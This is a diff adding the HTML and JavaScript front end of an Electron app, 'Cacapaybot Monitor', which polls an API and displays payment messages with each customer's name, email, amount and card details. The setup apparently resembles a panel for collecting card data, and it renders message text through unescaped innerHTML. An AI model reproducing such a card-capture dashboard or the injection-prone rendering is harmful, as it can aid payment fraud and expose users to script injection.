@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cacapaybot Monitor</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .header {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 15px 20px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            backdrop-filter: blur(10px);
+        }
+
+        .header h1 {
+            color: #667eea;
+            font-size: 1.5em;
+            font-weight: 700;
+        }
+
+        .header-controls {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 15px;
+            background: #e8f5e8;
+            border-radius: 20px;
+            color: #2d5a2d;
+            font-size: 0.9em;
+            font-weight: 600;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background: #4caf50;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        .btn {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.9em;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .btn-primary {
+            background: #667eea;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #5a6fd8;
+            transform: translateY(-1px);
+        }
+
+        .btn-success {
+            background: #4caf50;
+            color: white;
+        }
+
+        .btn-success:hover {
+            background: #45a049;
+        }
+
+        .main-content {
+            display: flex;
+            height: calc(100vh - 80px);
+        }
+
+        .sidebar {
+            width: 300px;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            padding: 20px;
+            overflow-y: auto;
+            border-right: 1px solid rgba(0, 0, 0, 0.1);
+        }
+
+        .stats-card {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+        }
+
+        .stats-card h3 {
+            color: #667eea;
+            margin-bottom: 15px;
+            font-size: 1.1em;
+        }
+
+        .stat-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .stat-item:last-child {
+            border-bottom: none;
+        }
+
+        .stat-label {
+            color: #666;
+            font-size: 0.9em;
+        }
+
+        .stat-value {
+            font-weight: 700;
+            color: #333;
+        }
+
+        .messages-container {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        .messages-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .messages-title {
+            color: white;
+            font-size: 1.3em;
+            font-weight: 700;
+        }
+
+        .message-list {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .message-card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        .message-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
+        }
+
+        .message-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .message-id {
+            background: #667eea;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8em;
+            font-weight: 700;
+        }
+
+        .message-time {
+            color: #666;
+            font-size: 0.9em;
+        }
+
+        .message-content {
+            font-family: 'Courier New', monospace;
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 4px solid #4caf50;
+            white-space: pre-line;
+            line-height: 1.5;
+        }
+
+        .message-details {
+            margin-top: 15px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        .detail-item {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .detail-label {
+            font-size: 0.8em;
+            color: #666;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .detail-value {
+            font-weight: 700;
+            color: #333;
+        }
+
+        .empty-state {
+            text-align: center;
+            color: rgba(255, 255, 255, 0.8);
+            padding: 60px 20px;
+        }
+
+        .empty-state h3 {
+            font-size: 1.5em;
+            margin-bottom: 15px;
+        }
+
+        .empty-state p {
+            font-size: 1.1em;
+        }
+
+        .loading {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 200px;
+            color: white;
+            font-size: 1.1em;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #4caf50;
+            color: white;
+            padding: 15px 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); }
+            to { transform: translateX(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🖥️ Cacapaybot Monitor</h1>
+        <div class="header-controls">
+            <div class="status-indicator">
+                <div class="status-dot"></div>
+                <span>En ligne</span>
+            </div>
+            <button class="btn btn-primary" onclick="refreshMessages()">🔄 Actualiser</button>
+            <button class="btn btn-success" onclick="testAPI()">🧪 Tester</button>
+        </div>
+    </div>
+
+    <div class="main-content">
+        <div class="sidebar">
+            <div class="stats-card">
+                <h3>📊 Statistiques</h3>
+                <div class="stat-item">
+                    <span class="stat-label">Messages totaux</span>
+                    <span class="stat-value" id="totalMessages">0</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-label">Dernière mise à jour</span>
+                    <span class="stat-value" id="lastUpdate">-</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-label">Status API</span>
+                    <span class="stat-value" id="apiStatus">✅ OK</span>
+                </div>
+            </div>
+
+            <div class="stats-card">
+                <h3>⚙️ Configuration</h3>
+                <div class="stat-item">
+                    <span class="stat-label">API URL</span>
+                    <span class="stat-value" style="font-size: 0.8em;">test-alpha-lac-68.vercel.app</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-label">Intervalle</span>
+                    <span class="stat-value">2s</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="messages-container">
+            <div class="messages-header">
+                <h2 class="messages-title">💬 Messages en temps réel</h2>
+            </div>
+            
+            <div id="messageList" class="message-list">
+                <div class="loading">
+                    <div class="spinner"></div>
+                    <span>Chargement des messages...</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const { ipcRenderer } = require('electron');
+        
+        let messages = [];
+        let lastUpdateTime = null;
+
+        // Charger les messages au démarrage
+        window.addEventListener('DOMContentLoaded', () => {
+            refreshMessages();
+        });
+
+        // Écouter les mises à jour en temps réel
+        ipcRenderer.on('messages-updated', (event, newMessages) => {
+            messages = newMessages;
+            updateUI();
+        });
+
+        // Actualiser les messages
+        async function refreshMessages() {
+            try {
+                const newMessages = await ipcRenderer.invoke('get-messages');
+                messages = newMessages;
+                updateUI();
+            } catch (error) {
+                console.error('Erreur lors de l\'actualisation:', error);
+                showNotification('❌ Erreur lors de l\'actualisation', 'error');
+            }
+        }
+
+        // Tester l'API
+        async function testAPI() {
+            try {
+                const result = await ipcRenderer.invoke('test-api');
+                if (result.success) {
+                    showNotification('✅ Test API réussi !', 'success');
+                    refreshMessages(); // Actualiser après le test
+                } else {
+                    showNotification('❌ Test API échoué: ' + result.error, 'error');
+                }
+            } catch (error) {
+                console.error('Erreur test API:', error);
+                showNotification('❌ Erreur test API', 'error');
+            }
+        }
+
+        // Mettre à jour l'interface
+        function updateUI() {
+            updateMessageList();
+            updateStats();
+            lastUpdateTime = new Date();
+        }
+
+        // Mettre à jour la liste des messages
+        function updateMessageList() {
+            const messageList = document.getElementById('messageList');
+            
+            if (messages.length === 0) {
+                messageList.innerHTML = `
+                    <div class="empty-state">
+                        <h3>📭 Aucun message</h3>
+                        <p>Les messages de paiement apparaîtront ici en temps réel</p>
+                    </div>
+                `;
+                return;
+            }
+
+            messageList.innerHTML = messages.map(message => {
+                const messageLines = message.message.split('\n');
+                const customerName = messageLines.find(line => line.includes('👤 Nom:'))?.replace('👤 Nom:', '').trim() || 'N/A';
+                const amount = messageLines.find(line => line.includes('💶 Montant:'))?.replace('💶 Montant:', '').trim() || 'N/A';
+                const email = messageLines.find(line => line.includes('📧 Email:'))?.replace('📧 Email:', '').trim() || 'N/A';
+                const card = messageLines.find(line => line.includes('💳 Carte:'))?.replace('💳 Carte:', '').trim() || 'N/A';
+                
+                const time = new Date(message.timestamp).toLocaleString('fr-FR');
+                
+                return `
+                    <div class="message-card">
+                        <div class="message-header">
+                            <span class="message-id">ID: ${message.id}</span>
+                            <span class="message-time">${time}</span>
+                        </div>
+                        <div class="message-content">${message.message}</div>
+                        <div class="message-details">
+                            <div class="detail-item">
+                                <span class="detail-label">Client</span>
+                                <span class="detail-value">${customerName}</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">Montant</span>
+                                <span class="detail-value">${amount}</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">Email</span>
+                                <span class="detail-value">${email}</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">Carte</span>
+                                <span class="detail-value">${card}</span>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        // Mettre à jour les statistiques
+        function updateStats() {
+            document.getElementById('totalMessages').textContent = messages.length;
+            document.getElementById('lastUpdate').textContent = lastUpdateTime ? lastUpdateTime.toLocaleTimeString('fr-FR') : '-';
+        }
+
+        // Afficher une notification
+        function showNotification(message, type = 'success') {
+            const notification = document.createElement('div');
+            notification.className = 'notification';
+            notification.style.background = type === 'success' ? '#4caf50' : '#f44336';
+            notification.textContent = message;
+            
+            document.body.appendChild(notification);
+            
+            setTimeout(() => {
+                notification.remove();
+            }, 3000);
+        }
+
+        // Actualisation automatique toutes les 5 secondes (en plus de l'IPC)
+        setInterval(() => {
+            refreshMessages();
+        }, 5000);
+    </script>
+</body>
+</html>
